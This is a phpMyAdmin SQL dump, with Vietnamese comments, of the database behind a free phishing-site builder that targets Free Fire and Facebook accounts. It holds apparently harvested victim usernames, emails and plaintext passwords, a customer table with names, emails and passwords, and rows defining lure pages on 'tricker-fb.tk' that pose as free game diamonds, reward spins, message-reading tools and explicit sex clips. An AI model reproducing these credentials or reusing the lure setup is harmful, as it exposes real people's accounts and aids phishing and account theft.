-- phpMyAdmin SQL Dump
-- version 4.9.7
-- https://www.phpmyadmin.net/
--
-- Máy chủ: localhost:3306
-- Thời gian đã tạo: Th4 13, 2022 lúc 09:35 PM
-- Phiên bản máy phục vụ: 10.3.34-MariaDB-log-cll-lve
-- Phiên bản PHP: 7.4.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `ttaoshopaccga_scamer`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `password` varchar(30) NOT NULL,
  `email` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `admin`
--

INSERT INTO `admin` (`id`, `password`, `email`) VALUES
(1, 'Admin', 'Admin');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `caidat`
--

CREATE TABLE `caidat` (
  `id` int(11) NOT NULL,
  `tieude` varchar(555) NOT NULL,
  `logo` varchar(255) NOT NULL,
  `header` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `caidat`
--

INSERT INTO `caidat` (`id`, `tieude`, `logo`, `header`) VALUES
(1, 'Táº¡o Web Scam Miá»…n PhÃ­, Phising Scam Acc Free Fire KhÃ´ng Cáº§n Viáº¿t Code', 'https://img-anons1.wibu-team.com/wb-team-free-upload-1981364308.png', '');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `domain`
--

CREATE TABLE `domain` (
  `id` int(11) NOT NULL,
  `domain` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `scam_account`
--

CREATE TABLE `scam_account` (
  `id` int(11) NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(30) NOT NULL,
  `uid` int(255) NOT NULL,
  `time` datetime(6) NOT NULL DEFAULT current_timestamp(6) ON UPDATE current_timestamp(6)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `scam_account`
--

INSERT INTO `scam_account` (`id`, `username`, `password`, `uid`, `time`) VALUES
(30, 'Admin13383763', 'hahahahaha', 9, '2022-04-04 23:26:02.373943'),
(31, 'caotuananh1801@gmail.com', 'Lien2302', 17, '2022-04-05 12:28:02.765300'),
(32, 'longmobile13627@gmail.com', 'phamdat11', 17, '2022-04-05 12:34:10.351176'),
(33, '0785141975', '11072000', 17, '2022-04-05 13:35:24.454280'),
(34, 'datcony124@gmail.com', 'Ä‘ateptrai', 18, '2022-04-07 11:04:46.405481'),
(35, 'datcony124@gmail.com', 'Ä‘ateptrai', 18, '2022-04-07 11:08:17.280360'),
(36, 'datcony124@gmail.com', 'Ä‘ateptrai', 18, '2022-04-08 09:15:14.234832');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `user`
--

CREATE TABLE `user` (
  `id` int(100) NOT NULL,
  `ten` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Đang đổ dữ liệu cho bảng `user`
--

INSERT INTO `user` (`id`, `ten`, `email`, `password`) VALUES
(9, 'NGUYEN HUU THANH', 'thanhda4329q@gmail.com ', 'Thanh2005'),
(10, 'anuniteit', 'myphuong7796@gmail.com', 'anuniteit'),
(12, 'nguyen vantrung', 'Hayngu119@gmail.com', '12345678'),
(13, 'thanh mÃºt cu phÃºc', 'thanhbucuphuc12@gmail.com', 'phucditthanh'),
(15, 'Tráº§n Äá»©c HÃ²a', 'lunmatu002x@gmail.com', 'matkhaula'),
(16, 'BÃ¹i Táº¥n Sang', 'sangbui0197@gmail.con', 'sangbui1'),
(17, 'VÅ© Báº£o Long', 'longmobile13627@gmail.com', 'phamdat11'),
(18, 'nvha', 'datcony124@gmail.com', 'Ä‘ateptrai'),
(19, 'ÃŠ Ãª', 'sondztv55@gmail.com', 'son190112006'),
(20, 'kiet', 'vutrananhkiet133@gmail.com', '14141414'),
(21, 'Tran dang khoi', 'Khoaprovjp@gmail.com', 'khoaprovjp'),
(22, 'Nguyá»…n VÄƒn DÅ©ng', 'hoynie0704@gmail.com', 'Brad0704'),
(23, 'NgocTram', 'ThuyyLinhh206@hotmail.com ', '1801207'),
(24, 'vÅ© huy tuáº¥n ', 'vuhuytuan345@gmail.com', 'dtpsmycr'),
(25, 'trancong', 'kieubac1976@gmail.com', 'congdzs1tg');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `web`
--

CREATE TABLE `web` (
  `id` int(11) NOT NULL,
  `tieude` varchar(255) NOT NULL,
  `domain` varchar(300) NOT NULL,
  `trangcuoi` varchar(955) NOT NULL,
  `giaodien` varchar(255) NOT NULL,
  `uid` varchar(255) NOT NULL,
  `videosex` varchar(955) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `web`
--

INSERT INTO `web` (`id`, `tieude`, `domain`, `trangcuoi`, `giaodien`, `uid`, `videosex`) VALUES
(28, 'Nháº­n Kim CÆ°Æ¡ng Miá»…n PhÃ­ !', 'tricker-fb.tk', 'Https://ff.garena.vn', 'Qua-Mien-Phi?MiniGame=', '9', ''),
(29, 'Web Nháº­n Äá»“ Free Cá»§a Garena', 'tricker-fb.tk', '', '', '16', ''),
(30, 'Wed Blong', 'tricker-fb.tk', '', '', '17', ''),
(31, 'Wed Blong', 'tricker-fb.tk', 'Haha', 'Doc-Trom?DocTrom=', '17', 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4_eLD7CvKNddBOe5LwAUMycvv1B0s7YkERQ&usqp=CAU'),
(32, 'Wed  nháº­n mÃ£ng xÃ ', 'tricker-fb.tk', 'Ahihi', 'Vong-Quay-Mang-Xa?MiniGame=', '17', 'https://tricker-fb.tk/Url/Doc-Trom?DocTrom=31'),
(33, 'Wed Ä‘á»c tin nháº¯n', 'tricker-fb.tk', 'Äá»£i má»™t tÃ½ Ä‘ang load?', '', '17', 'caotuananh1801@gmail.com'),
(34, 'Wed Ä‘á»c tin fb', 'tricker-fb.tk', 'Tk mk sai..', 'Doc-Trom?DocTrom=', '17', 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4_eLD7CvKNddBOe5LwAUMycvv1B0s7YkERQ&usqp=CAU'),
(35, 'Nháº­n Ngay LÆ°á»£t Quay Miá»…n PhÃ­ VÃ²ng Quay MÃ£ng XÃ  !', 'tricker-fb.tk', 'https://ff.garena.com/', 'Vong-Quay-Mang-Xa?MiniGame=', '18', ''),
(36, 'PhÃ¡ trinh em ngÆ°á»i yÃªu má»›i lá»›n', 'tricker-fb.tk', 'https://lonto18.com/phim-du-rat-lon_747576786c6429.html', 'Clip-Sex-Nong-Hot-Nhat?ClipSex_ID=', '18', ''),
(37, 'Nháº­n Ngay LÆ°á»£t Quay Miá»…n PhÃ­ VÃ²ng Quay MÃ£ng XÃ  !', 'tricker-fb.tk', '', 'Qua-Mien-Phi?MiniGame=', '18', ''),
(38, 'Clip BÃº Lá»“n Em GÃ¡i Xinh TÆ°Æ¡i', 'tricker-fb.tk', 'https://gaigutv.net', 'Clip-Sex-Nong-Hot-Nhat?ClipSex_ID=', '9', 'https://gaigutv.net/media/videos/tmb/14046/18.jpg'),
(39, 'Hello', 'tricker-fb.tk', '', '', '19', ''),
(40, 'Hello hiaiajaha', 'tricker-fb.tk', 'tiktok.com', 'Doc-Trom?DocTrom=', '19', 'facebook.com'),
(41, '', 'tricker-fb.tk', '', '', '19', ''),
(42, 'Nháº­n QuÃ  Free Fire', 'tricker-fb.tk', '', 'Qua-Mien-Phi?MiniGame=', '21', ''),
(43, 'Nháº­n quÃ  sinh nháº­t Free Fire', 'tricker-fb.tk', '', '', '23', ''),
(44, 'Nháº­n quÃ  sinh nháº­t Free Fire', 'tricker-fb.tk', 'https://membership.vn', '', '23', '/storage/emulated/O/DCIM/Screenshots/Screenshot_2022-04-12-19-53-23_a23 b203fd3aafc6dcb84e438dda678b6~2.jpg'),
(45, '', 'tricker-fb.tk', '', '', '23', ''),
(46, 'Nháº­n Kim CÆ°Æ¡ng Miá»…n PhÃ­', 'tricker-fb.tk', '', '', '25', 'https://ff.garena.vn'),
(47, 'Nháº­n Kim CÆ°Æ¡ng Miá»…n PhÃ­', 'tricker-fb.tk', '', 'Qua-Mien-Phi?MiniGame=', '25', 'https://ff.garena.vn');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `caidat`
--
ALTER TABLE `caidat`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `domain`
--
ALTER TABLE `domain`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `scam_account`
--
ALTER TABLE `scam_account`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `web`
--
ALTER TABLE `web`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT cho bảng `caidat`
--
ALTER TABLE `caidat`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT cho bảng `domain`
--
ALTER TABLE `domain`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT cho bảng `scam_account`
--
ALTER TABLE `scam_account`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=37;

--
-- AUTO_INCREMENT cho bảng `user`
--
ALTER TABLE `user`
  MODIFY `id` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT cho bảng `web`
--
ALTER TABLE `web`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=48;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
